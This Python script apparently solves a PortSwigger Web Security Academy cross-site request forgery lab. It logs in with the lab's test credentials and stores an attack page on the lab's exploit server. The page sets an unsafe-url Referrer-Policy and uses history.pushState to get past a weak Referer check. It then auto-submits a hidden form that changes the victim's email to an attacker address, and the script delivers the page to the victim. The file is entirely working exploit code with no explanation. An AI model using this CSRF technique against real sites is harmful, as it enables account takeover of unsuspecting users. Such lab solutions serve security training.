import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'

session = requests.Session()


response = session.get(burp_url)
match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text)
exploit_server = match.group(0)
deliver = exploit_server+ '/deliver-to-victim'

session = requests.Session()
burp_data = {"username": "wiener", "password": "peter"}
session.post(login_url, data=burp_data)

burp_data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nReferrer-Policy: unsafe-url", "responseBody": f"<html>\r\n  <body>\r\n<script> history.pushState('', '', '/?{burp_url[8:]}'); </script>\r\n    <form action=\"{burp_url}/my-account/change-email\" method=\"POST\">\r\n      <input type=\"hidden\" name=\"email\" value=\"hacker&#64;hacker&#46;com\" />\r\n      <input type=\"submit\" value=\"Submit request\" />\r\n    </form>\r\n    <script>\r\n      document.forms[0].submit();\r\n    </script>\r\n  </body>\r\n</html>\r\n", "formAction": "STORE"}
session.post(exploit_server, data=burp_data)

session.get(deliver)
